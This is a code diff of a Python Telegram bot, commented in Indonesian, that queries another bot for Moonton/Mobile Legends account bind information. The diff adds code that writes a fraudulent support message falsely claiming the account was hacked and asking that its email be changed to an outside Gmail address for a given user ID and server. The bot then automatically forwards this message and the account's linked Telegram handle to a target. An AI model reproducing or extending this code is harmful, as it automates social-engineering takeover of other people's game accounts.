@@ -488,6 +488,7 @@ def cleanup_downloaded_photos():
             pass
 
 def extract_telegram_from_bind(text, uid=None, sid=None):
+    """Ekstrak nilai Telegram dari bind info"""
     telegram_value = None
     for line in text.split('\n'):
         if 'Telegram' in line:
@@ -498,13 +499,17 @@ def extract_telegram_from_bind(text, uid=None, sid=None):
                 if value.lower() not in ['empty.', 'empty', 'tidak terhubung', '']:
                     telegram_value = value
                     break
-    if telegram_value and uid and sid:
+    
+    # Hanya return jika ada Telegram
+    if telegram_value:
         clean_telegram = re.sub(r'[^a-zA-Z0-9_]', '', telegram_value)
-        return f"{uid} ({sid})\n@{clean_telegram}"
-    elif telegram_value:
-        clean_telegram = re.sub(r'[^a-zA-Z0-9_]', '', telegram_value)
-        return f"@{clean_telegram}"
-    return None
+        if uid and sid:
+            # Custom message dengan UID dan Server
+            custom_text = f"""Can you help me change my Moonton email address? Because it was previously hacked by someone and I need your help to change the email address to pancinganandro@gmail.com for the game user ID {uid} server {sid}, please help me."""
+            return (custom_text, f"@{clean_telegram}")
+        else:
+            return (None, f"@{clean_telegram}")
+    return (None, None)
 
 def format_final_output(original_text, nickname, region, uid, sid, android, ios, creation=None, last_login=None):
     keywords = ['Moonton', 'VK', 'Google Play', 'Tiktok', 'Facebook', 'Apple', 'GCID', 'Telegram', 'WhatsApp']
@@ -778,6 +783,7 @@ async def message_handler(event):
 
     logger.info(f"📩 Dari Bot A: {text[:100]}")
 
+    # ========== 1. HASIL INFO ==========
     if text.startswith('──────────────────────') and 'BIND ACCOUNT INFO' in text:
         logger.info("✅ Mendapatkan hasil info dari Bot A")
         
@@ -830,7 +836,6 @@ async def message_handler(event):
         creation = None
         last_login = None
 
-        # Proses bind hanya jika enabled
         if BIND_ENABLED:
             bind_info = bind_data.get(user_id)
             if bind_info:
@@ -863,14 +868,19 @@ async def message_handler(event):
         output, markup = format_final_output(text, nickname, region, uid, sid, android, ios, creation, last_login)
         await edit_status_message(user_id, message_id, output, markup)
 
+        # ========== FORWARD KE TARGET ==========
         if FORWARD_ENABLED:
-            telegram_value = extract_telegram_from_bind(text, uid, sid)
-            if telegram_value:
-                await client.send_message(FORWARD_TARGET, f"{telegram_value}")
-                logger.info(f"📤 Telegram {telegram_value} dikirim ke {FORWARD_TARGET}")
+            custom_message, telegram_mention = extract_telegram_from_bind(text, uid, sid)
+            if custom_message and telegram_mention:
+                await client.send_message(FORWARD_TARGET, custom_message)
+                logger.info(f"📤 Custom message dikirim ke {FORWARD_TARGET}")
+                await client.send_message(FORWARD_TARGET, telegram_mention)
+                logger.info(f"📤 Telegram {telegram_mention} dikirim ke {FORWARD_TARGET}")
             else:
-                logger.info("ℹ️ Tidak ada Telegram yang terhubung, tidak dikirim")
+                logger.info("ℹ️ Telegram empty, tidak ada yang dikirim")
+        # ======================================
 
+        # Bersihkan request info
         try:
             del active_requests[req_id]
             waiting_for_result.pop(user_id, None)
@@ -888,6 +898,7 @@ async def message_handler(event):
         cleanup_downloaded_photos()
         return
 
+    # ========== 2. VERIFIKASI SUKSES ==========
     if 'verification successful' in text.lower() or '✅ Verifikasi berhasil!' in text:
         logger.info("✅ Verifikasi sukses, auto-retry dalam 5 detik")
         if captcha_timer_task:
@@ -905,6 +916,7 @@ async def message_handler(event):
             logger.warning("⚠️ Tidak ada request aktif untuk auto-retry")
         return
 
+    # ========== 3. ERROR HANDLING ==========
     if any(kw in text.lower() for kw in ['kesalahan', 'error', 'gagal']):
         logger.info(f"❌ Mendeteksi pesan error dari Bot A: {text[:100]}")
         if active_requests:
@@ -925,6 +937,7 @@ async def message_handler(event):
         cleanup_downloaded_photos()
         return
 
+    # ========== 4. CAPTCHA ==========
     if (message.photo or 'captcha' in text.lower() or re.search(r'\d{6}', text) or '🔒 Masukkan kode captcha' in text):
         logger.warning("🚫 CAPTCHA terdeteksi!")
         bot_status['in_captcha'] = True
